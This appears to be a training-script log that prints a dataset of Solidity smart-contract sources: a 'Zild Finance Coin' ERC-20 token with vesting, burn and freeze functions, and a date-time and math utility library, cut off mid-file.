2.0.0
device= cpu
train_dataset 3 (['pragma solidity 0.5.4;\n\ninterface IERC20 {\n\n\n\n\n\n    function balanceOf(address account) external view returns (uint256);\n\n\n    function transfer(address recipient, uint256 amount) external returns (bool);\n\n\n    function allowance(address owner, address spender) external view returns (uint256);\n\n\n    function approve(address spender, uint256 amount) external returns (bool);\n\n\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n\n\n\n\n}\n\ncontract Ownable {\n\n\n\n\n\n    address private _owner;\n\n\n\n\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n\n\n\n\n    constructor() internal {\n\n\n        _owner = msg.sender;\n\n\n        emit OwnershipTransferred(address(0), _owner);\n\n\n    }\n\n\n\n\n\n    function owner() public view returns (address) {\n\n\n        return _owner;\n\n\n    }\n\n\n\n\n\n    function isOwner() public view returns (bool) {\n\n\n        return msg.sender == _owner;\n\n\n    }\n\n\n\n\n\n    modifier onlyOwner() {\n\n\n        require(msg.sender == _owner, "Ownable: caller is not the owner");\n\n\n        _;\n\n\n    }\n\n\n\n\n\n    function transferOwnership(address newOwner) public onlyOwner {\n\n\n        require(newOwner != address(0), "Ownable: new owner is the zero address");\n\n\n        emit OwnershipTransferred(_owner, newOwner);\n\n\n        _owner = newOwner;\n\n\n    }\n\n\n\n\n\n}\n\nlibrary SafeMath {\n\n\n    /**\n\n\n     * @dev Returns the addition of two unsigned integers, reverting on\n\n\n     * overflow.\n\n\n     *\n\n\n     * Counterpart to Solidity\'s `+` operator.\n\n\n     *\n\n\n     * Requirements:\n\n\n     * - Addition cannot overflow.\n\n\n     */\n\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n\n\n        uint256 c = a + b;\n\n\n        require(c >= a, "SafeMath: addition overflow");\n\n\n\n\n\n        return c;\n\n\n    }\n\n\n\n\n\n    /**\n\n\n     * @dev Returns the subtraction of two unsigned integers, reverting on\n\n\n     * overflow (when the result is negative).\n\n\n     *\n\n\n     * Counterpart to Solidity\'s `-` operator.\n\n\n     *\n\n\n     * Requirements:\n\n\n     * - Subtraction cannot overflow.\n\n\n     */\n\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n\n\n        return sub(a, b, "SafeMath: subtraction overflow");\n\n\n    }\n\n\n\n\n\n    /**\n\n\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n\n\n     * overflow (when the result is negative).\n\n\n     *\n\n\n     * Counterpart to Solidity\'s `-` operator.\n\n\n     *\n\n\n     * Requirements:\n\n\n     * - Subtraction cannot overflow.\n\n\n     *\n\n\n     * _Available since v2.4.0._\n\n\n     */\n\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n\n\n        require(b <= a, errorMessage);\n\n\n        uint256 c = a - b;\n\n\n\n\n\n        return c;\n\n\n    }\n\n\n\n\n\n    /**\n\n\n     * @dev Returns the multiplication of two unsigned integers, reverting on\n\n\n     * overflow.\n\n\n     *\n\n\n     * Counterpart to Solidity\'s `*` operator.\n\n\n     *\n\n\n     * Requirements:\n\n\n     * - Multiplication cannot overflow.\n\n\n     */\n\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n\n\n        // Gas optimization: this is cheaper than requiring \'a\' not being zero, but the\n\n\n        // benefit is lost if \'b\' is also tested.\n\n\n        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n\n\n        if (a == 0) {\n\n\n            return 0;\n\n\n        }\n\n\n\n\n\n        uint256 c = a * b;\n\n\n        require(c / a == b, "SafeMath: multiplication overflow");\n\n\n\n\n\n        return c;\n\n\n    }\n\n\n\n\n\n    /**\n\n\n     * @dev Returns the integer division of two unsigned integers. Reverts on\n\n\n     * division by zero. The result is rounded towards zero.\n\n\n     *\n\n\n     * Counterpart to Solidity\'s `/` operator. Note: this function uses a\n\n\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n\n\n     * uses an invalid opcode to revert (consuming all remaining gas).\n\n\n     *\n\n\n     * Requirements:\n\n\n     * - The divisor cannot be zero.\n\n\n     */\n\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n\n\n        return div(a, b, "SafeMath: division by zero");\n\n\n    }\n\n\n\n\n\n    /**\n\n\n     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on\n\n\n     * division by zero. The result is rounded towards zero.\n\n\n     *\n\n\n     * Counterpart to Solidity\'s `/` operator. Note: this function uses a\n\n\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n\n\n     * uses an invalid opcode to revert (consuming all remaining gas).\n\n\n     *\n\n\n     * Requirements:\n\n\n     * - The divisor cannot be zero.\n\n\n     *\n\n\n     * _Available since v2.4.0._\n\n\n     */\n\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n\n\n        // Solidity only automatically asserts when dividing by 0\n\n\n        require(b > 0, errorMessage);\n\n\n        uint256 c = a / b;\n\n\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\n\n\n\n\n\n        return c;\n\n\n    }\n\n\n\n\n\n    /**\n\n\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n\n\n     * Reverts when dividing by zero.\n\n\n     *\n\n\n     * Counterpart to Solidity\'s `%` operator. This function uses a `revert`\n\n\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n\n\n     * invalid opcode to revert (consuming all remaining gas).\n\n\n     *\n\n\n     * Requirements:\n\n\n     * - The divisor cannot be zero.\n\n\n     */\n\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n\n\n        return mod(a, b, "SafeMath: modulo by zero");\n\n\n    }\n\n\n\n\n\n    /**\n\n\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n\n\n     * Reverts with custom message when dividing by zero.\n\n\n     *\n\n\n     * Counterpart to Solidity\'s `%` operator. This function uses a `revert`\n\n\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n\n\n     * invalid opcode to revert (consuming all remaining gas).\n\n\n     *\n\n\n     * Requirements:\n\n\n     * - The divisor cannot be zero.\n\n\n     *\n\n\n     * _Available since v2.4.0._\n\n\n     */\n\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n\n\n        require(b != 0, errorMessage);\n\n\n        return a % b;\n\n\n    }\n\n\n}\n\ncontract ZildFinanceCoin is Ownable, IERC20 {\n\n\n\n\n\n    using SafeMath for uint256;\n\n\n\n\n\n    string public constant name = \'Zild Finance Coin\';\n\n\n    string public constant symbol = \'Zild\';\n\n\n    uint8 public constant decimals = 18;\n\n\n    uint256 public totalSupply = 9980 * 10000 * 10 ** uint256(decimals);\n\n\n    uint256 public allowBurn = 2100 * 10000 * 10 ** uint256(decimals);\n\n\n    uint256 public tokenDestroyed;\n\n\n\t\n\n\n    uint256 public constant FounderAllocation = 1497 * 10000 * 10 ** uint256(decimals);\n\n\n    uint256 public constant FounderLockupAmount = 998 * 10000 * 10 ** uint256(decimals);\n\n\n    uint256 public constant FounderLockupCliff = 365 days;\n\n\n    uint256 public constant FounderReleaseInterval = 30 days;\n\n\n    uint256 public constant FounderReleaseAmount = 20.7916 * 10000 * 10 ** uint256(decimals);\n\n\n    uint256 public constant MarketingAllocation = 349 * 10000 * 10 ** uint256(decimals);\n\n\n    uint256 public constant FurnaceAllocation = 150 * 10000 * 10 ** uint256(decimals);\n\n\n\t\n\n\n    address public founder = address(0);\n\n\n    uint256 public founderLockupStartTime = 0;\n\n\n    uint256 public founderReleasedAmount = 0;\n\n\n\n\n\n    mapping (address => uint256) private _balances;\n\n\n    mapping (address => mapping (address => uint256)) private _allowances;    \n\n\n    mapping (address => bool) public frozenAccount;\n\n\n\n\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n\n    event Approval(address indexed from, address indexed to, uint256 value);\n\n\n    event ChangeFounder(address indexed previousFounder, address indexed newFounder);\n\n\n    event SetMinter(address indexed minter);\n\n\n    event SetMarketing(address indexed marketing);\n\n\n    event SetFurnace(address indexed furnace);\t\n\n\n    event Burn(address indexed _from, uint256 _tokenDestroyed, uint256 _timestamp);\n\n\n    event FrozenFunds(address target, bool frozen);\n\n\n\t\n\n\n    constructor(address _founder, address _marketing) public {\n\n\n        require(_founder != address(0), "ZildFinanceCoin: founder is the zero address");\n\n\n        require(_marketing != address(0), "ZildFinanceCoin: operator is the zero address");\n\n\n        founder = _founder;\n\n\n        founderLockupStartTime = block.timestamp;\n\n\n        _balances[address(this)] = totalSupply;\n\n\n        _transfer(address(this), _marketing, MarketingAllocation);\n\n\n    }\n\n\n\n\n\n    function release() public {\n\n\n        uint256 currentTime = block.timestamp;\n\n\n        uint256 cliffTime = founderLockupStartTime.add(FounderLockupCliff);\n\n\n        if (currentTime < cliffTime) return;\n\n\n        if (founderReleasedAmount >= FounderLockupAmount) return;\n\n\n        uint256 month = currentTime.sub(cliffTime).div(FounderReleaseInterval);\n\n\n        uint256 releaseAmount = month.mul(FounderReleaseAmount);\n\n\n        if (releaseAmount > FounderLockupAmount) releaseAmount = FounderLockupAmount;\n\n\n        if (releaseAmount <= founderReleasedAmount) return;\n\n\n        uint256 amount = releaseAmount.sub(founderReleasedAmount);\n\n\n        founderReleasedAmount = releaseAmount;\n\n\n        _transfer(address(this), founder, amount);\n\n\n    }\n\n\n\n\n\n    function balanceOf(address account) public view returns (uint256) {\n\n\n        return _balances[account];\n\n\n    }\n\n\n\n\n\n    function transfer(address to, uint256 amount) public returns (bool) {\n\n\n        require(to != address(0), "ERC20: tranfer to the zero address");\n\n\n        require(!frozenAccount[msg.sender]);\n\n\n        require(!frozenAccount[to]);\n\n\n        _transfer(msg.sender, to, amount);\n\n\n        return true;\n\n\n    }\n\n\n\t\n\n\n    function burn(uint256 _value) public returns (bool){\n\n\n        _burn(msg.sender, _value);\n\n\n        return true;\n\n\n    }\n\n\n\n\n\n    function _burn(address _who, uint256 _burntAmount) internal {\n\n\n        require (tokenDestroyed.add(_burntAmount) <= allowBurn, "ZildFinanceCoin: exceeded the maximum allowable burning amount" );\n\n\n        require(_balances[msg.sender] >= _burntAmount && _burntAmount > 0);\n\n\n        _transfer(address(_who), address(0), _burntAmount);\n\n\n        totalSupply = totalSupply.sub(_burntAmount);\n\n\n        tokenDestroyed = tokenDestroyed.add(_burntAmount);\n\n\n        emit Burn(_who, _burntAmount, block.timestamp);\n\n\n    }\n\n\n\t\n\n\n\n\n\n    function allowance(address from, address to) public view returns (uint256) {\n\n\n        return _allowances[from][to];\n\n\n    }\n\n\n\n\n\n    function approve(address to, uint256 amount) public returns (bool) {\n\n\n        _approve(msg.sender, to, amount);\n\n\n        return true;\n\n\n    }\n\n\n\n\n\n    function transferFrom(address from, address to, uint256 amount) public returns (bool) {\n\n\n        uint256 remaining = _allowances[from][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance");\n\n\n        require(to != address(0), "ERC20: tranfer to the zero address");\n\n\n        require(!frozenAccount[from]);\n\n\n        require(!frozenAccount[to]);\n\n\n        require(!frozenAccount[msg.sender]);\n\n\n        _transfer(from, to, amount);\n\n\n        _approve(from, msg.sender, remaining);\n\n\n        return true;\n\n\n    }\n\n\n\n\n\n    function _transfer(address from, address to, uint256 amount) private {\n\n\n        require(from != address(0), "ERC20: transfer from the zero address");\n\n\n        _balances[from] = _balances[from].sub(amount, "ERC20: transfer amount exceeds balance");\n\n\n        _balances[to] = _balances[to].add(amount);\n\n\n        emit Transfer(from, to, amount);\n\n\n    }\n\n\n\n\n\n    function _approve(address from, address to, uint256 amount) private {\n\n\n        require(from != address(0), "ERC20: approve from the zero address");\n\n\n        require(to != address(0), "ERC20: approve to the zero address");\n\n\n        _allowances[from][to] = amount;\n\n\n        emit Approval(from, to, amount);\n\n\n    }\n\n\n\n\n\n    function changeFounder(address _founder) public onlyOwner {\n\n\n        require(_founder != address(0), "ZildFinanceCoin: founder is the zero address");\n\n\n        emit ChangeFounder(founder, _founder);\n\n\n        founder = _founder;\n\n\n    }\n\n\n\n\n\n    function setMinter(address minter) public onlyOwner {\n\n\n        require(minter != address(0), "ZildFinanceCoin: minter is the zero address");\n\n\n        require(_balances[minter] == 0, "ZildFinanceCoin: minter has been initialized");\n\n\n        _transfer(address(this), minter, totalSupply.sub(FounderAllocation));\n\n\n        emit SetMinter(minter);\n\n\n    }\n\n\n\n\n\n    function setFurnace(address furnace) public onlyOwner {\n\n\n        require(furnace != address(0), "ZildFinanceCoin: furnace is the zero address");\n\n\n        require(_balances[furnace] == 0, "ZildFinanceCoin: furnace has been initialized");\n\n\n        _transfer(address(this), furnace, FurnaceAllocation);\n\n\n        emit SetFurnace(furnace);\n\n\n    }\n\n\n\t\n\n\n    function freezeAccount(address _target, bool _bool) public onlyOwner {\n\n\n        if (_target != address(0)) {\n\n\n            frozenAccount[_target] = _bool;\n\n\n            emit FrozenFunds(_target,_bool);\n\n\n        }\n\n\n    }\n\n\n\n\n\n}\n', 'pragma solidity 0.6.10;\npragma experimental ABIEncoderV2;\n\nlibrary BokkyPooBahsDateTimeLibrary {\n\n\n\n    uint constant SECONDS_PER_DAY = 24 * 60 * 60;\n\n    uint constant SECONDS_PER_HOUR = 60 * 60;\n\n    uint constant SECONDS_PER_MINUTE = 60;\n\n    int constant OFFSET19700101 = 2440588;\n\n\n\n    uint constant DOW_MON = 1;\n\n    uint constant DOW_TUE = 2;\n\n    uint constant DOW_WED = 3;\n\n    uint constant DOW_THU = 4;\n\n    uint constant DOW_FRI = 5;\n\n    uint constant DOW_SAT = 6;\n\n    uint constant DOW_SUN = 7;\n\n\n\n    // ------------------------------------------------------------------------\n\n    // Calculate the number of days from 1970/01/01 to year/month/day using\n\n    // the date conversion algorithm from\n\n    //   http://aa.usno.navy.mil/faq/docs/JD_Formula.php\n\n    // and subtracting the offset 2440588 so that 1970/01/01 is day 0\n\n    //\n\n    // days = day\n\n    //      - 32075\n\n    //      + 1461 * (year + 4800 + (month - 14) / 12) / 4\n\n    //      + 367 * (month - 2 - (month - 14) / 12 * 12) / 12\n\n    //      - 3 * ((year + 4900 + (month - 14) / 12) / 100) / 4\n\n    //      - offset\n\n    // ------------------------------------------------------------------------\n\n    function _daysFromDate(uint year, uint month, uint day) internal pure returns (uint _days) {\n\n        require(year >= 1970);\n\n        int _year = int(year);\n\n        int _month = int(month);\n\n        int _day = int(day);\n\n\n\n        int __days = _day\n\n          - 32075\n\n          + 1461 * (_year + 4800 + (_month - 14) / 12) / 4\n\n          + 367 * (_month - 2 - (_month - 14) / 12 * 12) / 12\n\n          - 3 * ((_year + 4900 + (_month - 14) / 12) / 100) / 4\n\n          - OFFSET19700101;\n\n\n\n        _days = uint(__days);\n\n    }\n\n\n\n    // ------------------------------------------------------------------------\n\n    // Calculate year/month/day from the number of days since 1970/01/01 using\n\n    // the date conversion algorithm from\n\n    //   http://aa.usno.navy.mil/faq/docs/JD_Formula.php\n\n    // and adding the offset 2440588 so that 1970/01/01 is day 0\n\n    //\n\n    // int L = days + 68569 + offset\n\n    // int N = 4 * L / 146097\n\n    // L = L - (146097 * N + 3) / 4\n\n    // year = 4000 * (L + 1) / 1461001\n\n    // L = L - 1461 * year / 4 + 31\n\n    // month = 80 * L / 2447\n\n    // dd = L - 2447 * month / 80\n\n    // L = month / 11\n\n    // month = month + 2 - 12 * L\n\n    // year = 100 * (N - 49) + year + L\n\n    // ------------------------------------------------------------------------\n\n    function _daysToDate(uint _days) internal pure returns (uint year, uint month, uint day) {\n\n        int __days = int(_days);\n\n\n\n        int L = __days + 68569 + OFFSET19700101;\n\n        int N = 4 * L / 146097;\n\n        L = L - (146097 * N + 3) / 4;\n\n        int _year = 4000 * (L + 1) / 1461001;\n\n        L = L - 1461 * _year / 4 + 31;\n\n        int _month = 80 * L / 2447;\n\n        int _day = L - 2447 * _month / 80;\n\n        L = _month / 11;\n\n        _month = _month + 2 - 12 * L;\n\n        _year = 100 * (N - 49) + _year + L;\n\n\n\n        year = uint(_year);\n\n        month = uint(_month);\n\n        day = uint(_day);\n\n    }\n\n\n\n    function timestampFromDate(uint year, uint month, uint day) internal pure returns (uint timestamp) {\n\n        timestamp = _daysFromDate(year, month, day) * SECONDS_PER_DAY;\n\n    }\n\n    function timestampFromDateTime(uint year, uint month, uint day, uint hour, uint minute, uint second) internal pure returns (uint timestamp) {\n\n        timestamp = _daysFromDate(year, month, day) * SECONDS_PER_DAY + hour * SECONDS_PER_HOUR + minute * SECONDS_PER_MINUTE + second;\n\n    }\n\n    function timestampToDate(uint timestamp) internal pure returns (uint year, uint month, uint day) {\n\n        (year, month, day) = _daysToDate(timestamp / SECONDS_PER_DAY);\n\n    }\n\n    function timestampToDateTime(uint timestamp) internal pure returns (uint year, uint month, uint day, uint hour, uint minute, uint second) {\n\n        (year, month, day) = _daysToDate(timestamp / SECONDS_PER_DAY);\n\n        uint secs = timestamp % SECONDS_PER_DAY;\n\n        hour = secs / SECONDS_PER_HOUR;\n\n        secs = secs % SECONDS_PER_HOUR;\n\n        minute = secs / SECONDS_PER_MINUTE;\n\n        second = secs % SECONDS_PER_MINUTE;\n\n    }\n\n\n\n    function isValidDate(uint year, uint month, uint day) internal pure returns (bool valid) {\n\n        if (year >= 1970 && month > 0 && month <= 12) {\n\n            uint daysInMonth = _getDaysInMonth(year, month);\n\n            if (day > 0 && day <= daysInMonth) {\n\n                valid = true;\n\n            }\n\n        }\n\n    }\n\n    function isValidDateTime(uint year, uint month, uint day, uint hour, uint minute, uint second) internal pure returns (bool valid) {\n\n        if (isValidDate(year, month, day)) {\n\n            if (hour < 24 && minute < 60 && second < 60) {\n\n                valid = true;\n\n            }\n\n        }\n\n    }\n\n    function isLeapYear(uint timestamp) internal pure returns (bool leapYear) {\n\n        uint year;\n\n        uint month;\n\n        uint day;\n\n        (year, month, day) = _daysToDate(timestamp / SECONDS_PER_DAY);\n\n        leapYear = _isLeapYear(year);\n\n    }\n\n    function _isLeapYear(uint year) internal pure returns (bool leapYear) {\n\n        leapYear = ((year % 4 == 0) && (year % 100 != 0)) || (year % 400 == 0);\n\n    }\n\n    function isWeekDay(uint timestamp) internal pure returns (bool weekDay) {\n\n        weekDay = getDayOfWeek(timestamp) <= DOW_FRI;\n\n    }\n\n    function isWeekEnd(uint timestamp) internal pure returns (bool weekEnd) {\n\n        weekEnd = getDayOfWeek(timestamp) >= DOW_SAT;\n\n    }\n\n    function getDaysInMonth(uint timestamp) internal pure returns (uint daysInMonth) {\n\n        uint year;\n\n        uint month;\n\n        uint day;\n\n        (year, month, day) = _daysToDate(timestamp / SECONDS_PER_DAY);\n\n        daysInMonth = _getDaysInMonth(year, month);\n\n    }\n\n    function _getDaysInMonth(uint year, uint month) internal pure returns (uint daysInMonth) {\n\n        if (month == 1 || month == 3 || month == 5 || month == 7 || month == 8 || month == 10 || month == 12) {\n\n            daysInMonth = 31;\n\n        } else if (month != 2) {\n\n            daysInMonth = 30;\n\n        } else {\n\n            daysInMonth = _isLeapYear(year) ? 29 : 28;\n\n        }\n\n    }\n\n    // 1 = Monday, 7 = Sunday\n\n    function getDayOfWeek(uint timestamp) internal pure returns (uint dayOfWeek) {\n\n        uint _days = timestamp / SECONDS_PER_DAY;\n\n        dayOfWeek = (_days + 3) % 7 + 1;\n\n    }\n\n\n\n    function getYear(uint timestamp) internal pure returns (uint year) {\n\n        uint month;\n\n        uint day;\n\n        (year, month, day) = _daysToDate(timestamp / SECONDS_PER_DAY);\n\n    }\n\n    function getMonth(uint timestamp) internal pure returns (uint month) {\n\n        uint year;\n\n        uint day;\n\n        (year, month, day) = _daysToDate(timestamp / SECONDS_PER_DAY);\n\n    }\n\n    function getDay(uint timestamp) internal pure returns (uint day) {\n\n        uint year;\n\n        uint month;\n\n        (year, month, day) = _daysToDate(timestamp / SECONDS_PER_DAY);\n\n    }\n\n    function getHour(uint timestamp) internal pure returns (uint hour) {\n\n        uint secs = timestamp % SECONDS_PER_DAY;\n\n        hour = secs / SECONDS_PER_HOUR;\n\n    }\n\n    function getMinute(uint timestamp) internal pure returns (uint minute) {\n\n        uint secs = timestamp % SECONDS_PER_HOUR;\n\n        minute = secs / SECONDS_PER_MINUTE;\n\n    }\n\n    function getSecond(uint timestamp) internal pure returns (uint second) {\n\n        second = timestamp % SECONDS_PER_MINUTE;\n\n    }\n\n\n\n    function addYears(uint timestamp, uint _years) internal pure returns (uint newTimestamp) {\n\n        uint year;\n\n        uint month;\n\n        uint day;\n\n        (year, month, day) = _daysToDate(timestamp / SECONDS_PER_DAY);\n\n        year += _years;\n\n        uint daysInMonth = _getDaysInMonth(year, month);\n\n        if (day > daysInMonth) {\n\n            day = daysInMonth;\n\n        }\n\n        newTimestamp = _daysFromDate(year, month, day) * SECONDS_PER_DAY + timestamp % SECONDS_PER_DAY;\n\n        require(newTimestamp >= timestamp);\n\n    }\n\n    function addMonths(uint timestamp, uint _months) internal pure returns (uint newTimestamp) {\n\n        uint year;\n\n        uint month;\n\n        uint day;\n\n        (year, month, day) = _daysToDate(timestamp / SECONDS_PER_DAY);\n\n        month += _months;\n\n        year += (month - 1) / 12;\n\n        month = (month - 1) % 12 + 1;\n\n        uint daysInMonth = _getDaysInMonth(year, month);\n\n        if (day > daysInMonth) {\n\n            day = daysInMonth;\n\n        }\n\n        newTimestamp = _daysFromDate(year, month, day) * SECONDS_PER_DAY + timestamp % SECONDS_PER_DAY;\n\n        require(newTimestamp >= timestamp);\n\n    }\n\n    function addDays(uint timestamp, uint _days) internal pure returns (uint newTimestamp) {\n\n        newTimestamp = timestamp + _days * SECONDS_PER_DAY;\n\n        require(newTimestamp >= timestamp);\n\n    }\n\n    function addHours(uint timestamp, uint _hours) internal pure returns (uint newTimestamp) {\n\n        newTimestamp = timestamp + _hours * SECONDS_PER_HOUR;\n\n        require(newTimestamp >= timestamp);\n\n    }\n\n    function addMinutes(uint timestamp, uint _minutes) internal pure returns (uint newTimestamp) {\n\n        newTimestamp = timestamp + _minutes * SECONDS_PER_MINUTE;\n\n        require(newTimestamp >= timestamp);\n\n    }\n\n    function addSeconds(uint timestamp, uint _seconds) internal pure returns (uint newTimestamp) {\n\n        newTimestamp = timestamp + _seconds;\n\n        require(newTimestamp >= timestamp);\n\n    }\n\n\n\n    function subYears(uint timestamp, uint _years) internal pure returns (uint newTimestamp) {\n\n        uint year;\n\n        uint month;\n\n        uint day;\n\n        (year, month, day) = _daysToDate(timestamp / SECONDS_PER_DAY);\n\n        year -= _years;\n\n        uint daysInMonth = _getDaysInMonth(year, month);\n\n        if (day > daysInMonth) {\n\n            day = daysInMonth;\n\n        }\n\n        newTimestamp = _daysFromDate(year, month, day) * SECONDS_PER_DAY + timestamp % SECONDS_PER_DAY;\n\n        require(newTimestamp <= timestamp);\n\n    }\n\n    function subMonths(uint timestamp, uint _months) internal pure returns (uint newTimestamp) {\n\n        uint year;\n\n        uint month;\n\n        uint day;\n\n        (year, month, day) = _daysToDate(timestamp / SECONDS_PER_DAY);\n\n        uint yearMonth = year * 12 + (month - 1) - _months;\n\n        year = yearMonth / 12;\n\n        month = yearMonth % 12 + 1;\n\n        uint daysInMonth = _getDaysInMonth(year, month);\n\n        if (day > daysInMonth) {\n\n            day = daysInMonth;\n\n        }\n\n        newTimestamp = _daysFromDate(year, month, day) * SECONDS_PER_DAY + timestamp % SECONDS_PER_DAY;\n\n        require(newTimestamp <= timestamp);\n\n    }\n\n    function subDays(uint timestamp, uint _days) internal pure returns (uint newTimestamp) {\n\n        newTimestamp = timestamp - _days * SECONDS_PER_DAY;\n\n        require(newTimestamp <= timestamp);\n\n    }\n\n    function subHours(uint timestamp, uint _hours) internal pure returns (uint newTimestamp) {\n\n        newTimestamp = timestamp - _hours * SECONDS_PER_HOUR;\n\n        require(newTimestamp <= timestamp);\n\n    }\n\n    function subMinutes(uint timestamp, uint _minutes) internal pure returns (uint newTimestamp) {\n\n        newTimestamp = timestamp - _minutes * SECONDS_PER_MINUTE;\n\n        require(newTimestamp <= timestamp);\n\n    }\n\n    function subSeconds(uint timestamp, uint _seconds) internal pure returns (uint newTimestamp) {\n\n        newTimestamp = timestamp - _seconds;\n\n        require(newTimestamp <= timestamp);\n\n    }\n\n\n\n    function diffYears(uint fromTimestamp, uint toTimestamp) internal pure returns (uint _years) {\n\n        require(fromTimestamp <= toTimestamp);\n\n        uint fromYear;\n\n        uint fromMonth;\n\n        uint fromDay;\n\n        uint toYear;\n\n        uint toMonth;\n\n        uint toDay;\n\n        (fromYear, fromMonth, fromDay) = _daysToDate(fromTimestamp / SECONDS_PER_DAY);\n\n        (toYear, toMonth, toDay) = _daysToDate(toTimestamp / SECONDS_PER_DAY);\n\n        _years = toYear - fromYear;\n\n    }\n\n    function diffMonths(uint fromTimestamp, uint toTimestamp) internal pure returns (uint _months) {\n\n        require(fromTimestamp <= toTimestamp);\n\n        uint fromYear;\n\n        uint fromMonth;\n\n        uint fromDay;\n\n        uint toYear;\n\n        uint toMonth;\n\n        uint toDay;\n\n        (fromYear, fromMonth, fromDay) = _daysToDate(fromTimestamp / SECONDS_PER_DAY);\n\n        (toYear, toMonth, toDay) = _daysToDate(toTimestamp / SECONDS_PER_DAY);\n\n        _months = toYear * 12 + toMonth - fromYear * 12 - fromMonth;\n\n    }\n\n    function diffDays(uint fromTimestamp, uint toTimestamp) internal pure returns (uint _days) {\n\n        require(fromTimestamp <= toTimestamp);\n\n        _days = (toTimestamp - fromTimestamp) / SECONDS_PER_DAY;\n\n    }\n\n    function diffHours(uint fromTimestamp, uint toTimestamp) internal pure returns (uint _hours) {\n\n        require(fromTimestamp <= toTimestamp);\n\n        _hours = (toTimestamp - fromTimestamp) / SECONDS_PER_HOUR;\n\n    }\n\n    function diffMinutes(uint fromTimestamp, uint toTimestamp) internal pure returns (uint _minutes) {\n\n        require(fromTimestamp <= toTimestamp);\n\n        _minutes = (toTimestamp - fromTimestamp) / SECONDS_PER_MINUTE;\n\n    }\n\n    function diffSeconds(uint fromTimestamp, uint toTimestamp) internal pure returns (uint _seconds) {\n\n        require(fromTimestamp <= toTimestamp);\n\n        _seconds = toTimestamp - fromTimestamp;\n\n    }\n\n}\n\nlibrary FractionUtils {\n\n    using SafeMath for uint;\n\n\n\n    struct Fraction {\n\n        uint numerator;\n\n        uint denominator;\n\n    }\n\n\n\n    function createFraction(uint numerator, uint denominator) internal pure returns (Fraction memory) {\n\n        require(denominator > 0, "Division by zero");\n\n        Fraction memory fraction = Fraction({numerator: numerator, denominator: denominator});\n\n        reduceFraction(fraction);\n\n        return fraction;\n\n    }\n\n\n\n    function createFraction(uint value) internal pure returns (Fraction memory) {\n\n        return createFraction(value, 1);\n\n    }\n\n\n\n    function reduceFraction(Fraction memory fraction) internal pure {\n\n        uint _gcd = gcd(fraction.numerator, fraction.denominator);\n\n        fraction.numerator = fraction.numerator.div(_gcd);\n\n        fraction.denominator = fraction.denominator.div(_gcd);\n\n    }\n\n\n\n    function multiplyFraction(Fraction memory a, Fraction memory b) internal pure returns (Fraction memory) {\n\n        return createFraction(a.numerator.mul(b.numerator), a.denominator.mul(b.denominator));\n\n    }\n\n\n\n    function gcd(uint a, uint b) internal pure returns (uint) {\n\n        uint _a = a;\n\n        uint _b = b;\n\n        if (_b > _a) {\n\n            (_a, _b) = swap(_a, _b);\n\n        }\n\n        while (_b > 0) {\n\n            _a = _a.mod(_b);\n\n            (_a, _b) = swap (_a, _b);\n\n        }\n\n        return _a;\n\n    }\n\n\n\n    function swap(uint a, uint b) internal pure returns (uint, uint) {\n\n        return (b, a);\n\n    }\n\n}\n\ninterface IDelegatableToken {\n\n    /**\n\n     * @dev Updates and returns the amount of locked tokens of a given account (`wallet`).\n\n     */\n\n    function getAndUpdateLockedAmount(address wallet) external returns (uint);\n\n    /**\n\n     * @dev Updates and returns the amount of delegated tokens of a given account (`wallet`).\n\n     */\n\n    function getAndUpdateDelegatedAmount(address wallet) external returns (uint);\n\n    /**\n\n     * @dev Updates and returns the amount of slashed tokens of a given account (`wallet`).\n\n     */\n\n    function getAndUpdateSlashedAmount(address wallet) external returns (uint);\n\n}\n\ninterface ILocker {\n\n    /**\n\n     * @dev Returns the locked amount of untransferable tokens of a given `wallet`\n\n     */\n\n    function getAndUpdateLockedAmount(address wallet) external returns (uint);\n\n\n\n    /**\n\n     * @dev Returns the locked amount of untransferable and un-delegatable tokens of a given `wallet`.\n\n     */\n\n    function getAndUpdateForbiddenForDelegationAmount(address wallet) external returns (uint);\n\n}\n\nlibrary MathUtils {\n\n    event UnderflowError(\n\n        uint a,\n\n        uint b\n\n    );\n\n\n\n    uint constant private _EPS = 1e6;\n\n\n\n    function boundedSub(uint256 a, uint256 b) internal returns (uint256) {\n\n        if (a >= b) {\n\n            return a - b;\n\n        } else {\n\n            emit UnderflowError(a, b);\n\n            return 0;\n\n        }\n\n    }\n\n\n\n    function boundedSubWithoutEvent(uint256 a, uint256 b) internal pure returns (uint256) {\n\n        if (a >= b) {\n\n            return a - b;\n\n        } else {\n\n            return 0;\n\n        }\n\n    }\n\n\n\n    function muchGreater(uint256 a, uint256 b) internal pure returns (bool) {\n\n        assert(uint(-1) - _EPS > b);\n\n        return a > b + _EPS;\n\n    }\n\n\n\n    function approximatelyEqual(uint256 a, uint256 b) internal pure returns (bool) {\n\n        if (a > b) {\n\n            return a - b < _EPS;\n\n        } else {\n\n            return b - a < _EPS;\n\n        }\n\n    }\n\n}\n\nabstract contract Context {\n\n    function _msgSender() internal view virtual returns (address payable) {\n\n        return msg.sender;\n\n    }\n\n\n\n    function _msgData() internal view virtual returns (bytes memory) {\n\n        this; // silence state mutability warning without generating bytecode - see 